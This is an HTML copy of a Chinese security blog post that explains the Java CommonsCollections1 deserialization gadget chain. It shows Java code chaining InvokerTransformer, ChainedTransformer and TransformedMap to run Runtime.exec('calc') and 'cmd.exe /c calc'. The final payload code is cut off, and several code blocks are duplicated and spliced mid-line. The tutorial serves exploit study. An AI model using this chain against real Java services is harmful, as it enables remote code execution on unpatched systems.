@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>Java-Deserialization-Chapter-Ⅲ - S0cke3t&#39;s Blog</title>
+    <meta charset="UTF-8">
+    <meta name="description" content="">
+    <meta name="keywords" content="渗透测试,CISP-PTE,代码审计,破解,移动安全,安全工具,漏洞利用">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="Java反序列化 - 章节Ⅲ CommonsCollections1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java-Deserialization-Chapter-Ⅲ">
+<meta property="og:url" content="https://www.saferoad.cc/Deserialization/Java-Deserialization-Chapter-%E2%85%A2.html">
+<meta property="og:site_name" content="S0cke3t&#39;s Blog">
+<meta property="og:description" content="Java反序列化 - 章节Ⅲ CommonsCollections1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301044246.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301104828.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301053231.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301102841.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301353060.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301353201.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301403152.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301409748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301412113.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301413872.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301422234.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301439847.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301446145.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301451922.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301507350.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301534516.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301540088.png">
+<meta property="article:published_time" content="2023-05-29T09:05:42.000Z">
+<meta property="article:modified_time" content="2023-08-05T03:50:18.497Z">
+<meta property="article:author" content="S0cke3t">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301044246.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
+    <link rel="stylesheet" href="/css/style.css?v=1691209190541">
+     
+    
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1691209190541">
+    
+<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="mdui-drawer-body-left">
+    
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/newbolg/202203272236776.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="S0cke3t" class="mdui-btn mdui-btn-icon"><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        
+<meta name="keywords" content="渗透测试,CISP-PTE,代码审计,破解,移动安全,安全工具,漏洞利用">
+
+<div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="S0cke3t">
+            <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t" alt="S0cke3t">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>42</div>
+        <div><span>标签</span>29</div>
+        <div><span>分类</span>12</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/aboutme.html" title="关于我">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于我
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:saferoad.cc" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/DeEpinGh0st/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Analysis/">Analysis</a>
+          <span class="category-list-count">11</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Android/">Android</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Audit/">Audit</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Bypass/">Bypass</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CISP-PTE/">CISP-PTE</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Case-share/">Case share</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crack/">Crack</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Deserialization/">Deserialization</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Docker/">Docker</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Emergency/">Emergency</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Notes/">Notes</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Sectool/">Sectool</a>
+          <span class="category-list-count">10</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/ASP-NET/" style="font-size: 12.5px;">ASP.NET</a> <a href="/tags/Bypass/" style="font-size: 15px;">Bypass</a> <a href="/tags/Csharp/" style="font-size: 17.5px;">Csharp</a> <a href="/tags/Django/" style="font-size: 10px;">Django</a> <a href="/tags/Domain-security/" style="font-size: 10px;">Domain security</a> <a href="/tags/Flink/" style="font-size: 10px;">Flink</a> <a href="/tags/Frida/" style="font-size: 10px;">Frida</a> <a href="/tags/Hook/" style="font-size: 10px;">Hook</a> <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/KeyGen/" style="font-size: 10px;">KeyGen</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Nim/" style="font-size: 10px;">Nim</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Portainer/" style="font-size: 10px;">Portainer</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/Realor/" style="font-size: 10px;">Realor</a> <a href="/tags/Reappearance/" style="font-size: 10px;">Reappearance</a> <a href="/tags/SecTool/" style="font-size: 10px;">SecTool</a> <a href="/tags/Seeyon/" style="font-size: 10px;">Seeyon</a> <a href="/tags/Spring/" style="font-size: 15px;">Spring</a> <a href="/tags/Sqlmap/" style="font-size: 10px;">Sqlmap</a> <a href="/tags/Struts2/" style="font-size: 10px;">Struts2</a> <a href="/tags/ThinkPHP/" style="font-size: 10px;">ThinkPHP</a> <a href="/tags/Windows/" style="font-size: 12.5px;">Windows</a> <a href="/tags/WordPress/" style="font-size: 10px;">WordPress</a> <a href="/tags/cuckoo/" style="font-size: 10px;">cuckoo</a> <a href="/tags/sandbox/" style="font-size: 10px;">sandbox</a> <a href="/tags/solution/" style="font-size: 10px;">solution</a>
+    </div>
+    
+  </div>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 S0cke3t
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br/>Too Young Too Sample
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+      
+          <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
+              <img data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305300956432.jpeg" data-sizes="auto" alt="Java-Deserialization-Chapter-Ⅲ" class="lazyload">
+              <h1>Java-Deserialization-Chapter-Ⅲ</h1>
+          </div>
+      
+      
+      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2023年05月29日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.9k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 9 分钟</a>
+</div>
+
+      
+
+      <h4 id="序"><a href="#序" class="headerlink" title="序"></a>序</h4><p>经过一个多月的忙碌，终于是有时间来更一下此系列的文章了,本文中会涉及到<code>java</code>反射和动态代理,如果你对相关不了解,建议先去学习下相关知识</p>
+<h4 id="CommonsCollections"><a href="#CommonsCollections" class="headerlink" title="CommonsCollections"></a>CommonsCollections</h4><p><a target="_blank" rel="noopener" href="http://commons.apache.org/proper/commons-collections/">Commons Collections</a>包为Java标准的<code>Collections API</code>提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。</p>
+<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p><code>Transformer</code>是一个接口，提供一个transform方法由实现类决定具体的转换逻辑</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301044246.png" alt="image-20230530104453624" class="lazyload"></p>
+<p>在<code>Transformer</code>实现类中，我们主要来看一下<code>InvokeTransformer</code>和<code>ChainedTransformer</code></p>
+<h4 id="InvokeTransformer"><a href="#InvokeTransformer" class="headerlink" title="InvokeTransformer"></a>InvokeTransformer</h4><p>首先来看一下构造函数,<code>Invoketransformer</code>共有两个构造函数</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301104828.png" alt="image-20230530110459787" class="lazyload"></p>
+<p>其中第一个只需要传入一个<code>String</code>类型的<code>methodName</code>,另一个除需传入<code>methodName</code>外，还需要指定方法的参数类型以及具体的参数值</p>
+<p>接下来看一下实现类的<code>transform</code>具体实现</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301053231.png" alt="image-20230530105322165" class="lazyload"></p>
+<p>在<code>transform</code>中在拿到传入的<code>object</code>后,利用反射调用自身实例化时传入的方法,并将结果返回</p>
+<p>到这里<code>InvokeTransformer</code>的作用我们就大致了解了,当我们实例化一个<code>InvokeTransformer</code>时传入一个要调用的方法名以及它的参数类型的具体的参数值</p>
+<p>随后在调用<code>transform</code>时指定一下方法的调用对象，<code>InvokeTransformer</code>会自动利用反射去调用相关方法</p>
+<p>如下利用<code>Invoketransformer</code>完成调用<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 调用的方法名 String</span><br><span class="hljs-comment">* 参数类型 Class[]</span><br><span class="hljs-comment">* 参数值 Object[]</span><br><span class="hljs-comment">* */</span><br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 要调用哪个对象的上述方法</span><br><span class="hljs-comment"><code class="language-hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 调用的方法名 String</span><br><span class="hljs-comment">* 参数类型 Class[]</span><br><span class="hljs-comment">* 参数值 Object[]</span><br><span class="hljs-comment">* */</span><br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 要调用哪个对象的上述方法</span><br><span class="hljs-comment">* */</span><br>transformer.transform(Runtime.getRuntime());<br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+
+
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301102841.png" alt="image-20230530110215777" class="lazyload"></p>
+<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>同样<code>ChainedTransformer</code>也是<code>Transformer</code>的一个实现类</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301353060.png" alt="image-20230530135259990" class="lazyload"></p>
+<p>它的构造函数需要我们传入一个<code>Transformer</code>类型的数组</p>
+<p>接着我们来看下<code>transformer</code>实现</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301353201.png" alt="image-20230530135357161" class="lazyload"></p>
+<p>通过实现不难看出在调用 <code>ChainedTransformer</code> 的<code> transform</code> 方法时，会循环数组，依次调用 <code>Transformer</code> 数<br>组中每个 <code>Transformer</code> 的 <code>transform </code>方法，并将执行的结果传递给下一个 <code>Transformer</code>，完成一个链式的调用</p>
+<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>有了上面的<code>ChainedTransformer</code>我们现在可以使用链式调用完成命令执行，接下来就需要找一个在对象操作时触发我们的<code>ChainedTransformer</code>调用的桥梁-<code>TransformedMap</code></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301403152.png" alt="image-20230530140323100" class="lazyload"></p>
+<p>从声明上不难看出，<code>TransformedMap</code>继承自<code>AbstractInputCheckedMapDecorator</code>作为装饰器使用，可以理解为Map提供增强功能</p>
+<p>单从代码上可能有点不好理解，看下面的类图就一目了然了</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301409748.png" alt="image-20230530140931695" class="lazyload"></p>
+<p>当我们用<code>TransformedMap</code>装饰一个<code>map</code>，并进行<code>put</code>时</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301412113.png" alt="image-20230530141254071" class="lazyload"></p>
+<p><code>TransformedMap</code>将会自动每个元素的<code>transformer</code>方法，这也就和上面<code>ChainedTransformer</code>衔接起来了</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301413872.png" alt="image-20230530141357828" class="lazyload"></p>
+<p>同样我们使用<code>TransformedMap</code>并结合<code>ChainedTransformer</code>完成调用<code>Runtime.GetRuntime().exec(&quot;calc&quot;)</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs java"><span class="hljs-comment">//定义transformer数组并结合invoketransformer完成runtime调用</span><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//ConstantTransformer用于初始化Runtime对象</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">//Class.getMethod(String, Class[])</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">//invoke(Object obj, Object... args)</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;cmd.exe /c calc&quot;</span>&#125;)<br>        &#125;;<br><span class="hljs-comment">//将构造好的Transformer[]包装进ChainedTransformer用于链式调用</span><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>HashMap&lt;String,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//使用TransformedMap修饰HashMap</span><br><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap,chainedTransformer,<span class="hljs-literal">null</span>);<br><span class="hljs-comment">//put时触发key或value的transformer,完成执行</span><br>map.put(<span class="hljs-string">&quot;S0cke3t&quot;</span>,<span class="hljs-number"><code class="language-hljs java"><span class="hljs-comment">//定义transformer数组并结合invoketransformer完成runtime调用</span><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//ConstantTransformer用于初始化Runtime对象</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">//Class.getMethod(String, Class[])</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">//invoke(Object obj, Object... args)</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;cmd.exe /c calc&quot;</span>&#125;)<br>        &#125;;<br><span class="hljs-comment">//将构造好的Transformer[]包装进ChainedTransformer用于链式调用</span><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>HashMap&lt;String,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//使用TransformedMap修饰HashMap</span><br><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap,chainedTransformer,<span class="hljs-literal">null</span>);<br><span class="hljs-comment">//put时触发key或value的transformer,完成执行</span><br>map.put(<span class="hljs-string">&quot;S0cke3t&quot;</span>,<span class="hljs-number">1</span>);<br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301422234.png" alt="image-20230530142219177" class="lazyload"></p>
+<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>到目前为止我们找到了完成反序列化漏洞的两个关键步骤<code>执行点</code>和<code>利用链</code>,接下来还需要一个<code>触发点</code>也就是重写了<code>readObject</code>的类来将整个过程串起来</p>
+<p>本节内容涉及到<code>java</code>动态代理的一些内容和特性,不了解的朋友可以先去学习一下<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/347141071">动态代理</a>基础知识</p>
+<p><code>AnnotationInvocationHandler</code>JDK原生类，用于注解形式的动态代理</p>
+<p>先从<code>readObject</code>看起</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301439847.png" alt="image-20230530143928771" class="lazyload"></p>
+<p>首先<code>readObject</code>通过<code>getInstance</code>获取到<code>type</code>对应的注解类型，而要<code>type</code>的条件在构造函数中也有要求</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301446145.png" alt="image-20230530144620094" class="lazyload"></p>
+<p><code>type</code>必须是一个注解，有且只有一个父接口并且是<code>Annotation</code>,只有满足这些条件<code>type</code>和<code>memberValue</code>才会被赋值</p>
+<p>回到<code>readObject</code></p>
+<p>在拿到注解类型后调用类型的<code>memberTypes</code>获取到可注解可设置的值</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301451922.png" alt="image-20230530145151855" class="lazyload"></p>
+<p>随后使用<code>while</code>循环这个<code>map</code>并设置其中的值，但在设置值之前有一个条件</p>
+<p><code>memberValues</code>中的值和获取到的注解类型中的值存在相同的值，并且这个值不是<code>ExceptionProxy</code>的实例也不能是<code>memberValues</code>的实例</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301507350.png" alt="image-20230530150752285" class="lazyload"></p>
+<p>到这里我们整个过程就串起来了</p>
+<p>整理一下思路</p>
+<p>首先我们需要一个<code>AnnotationInvocationHandler</code>根据构造函数需要传入一个注解类一个<code>Map</code>,并且根据上面赋值要求我们<code>Map</code>中的<code>key</code>要和注解类中有同样的值</p>
+<p>根据这个思路可以找到很多可以使用的注解类,比如<code>Target,Resource,Generated</code>等，笔者这里使用<code>Resource</code>的<code>name</code>属性</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301534516.png" alt="image-20230530153408457" class="lazyload"></p>
+<p>之后将这个<code>map</code>使用<code>TransformedMap</code>进行封装，使用<code>TransformedMap</code>进行修饰</p>
+<p>最后就是上面讲到的利用<code>InvokeTransformer</code>完成链式调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs java">Map&lt;Object,Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object,Object&gt;();<br><span class="hljs-comment">//注解类中必须有的属性</span><br>hashmap.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-number">2</span>);<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title 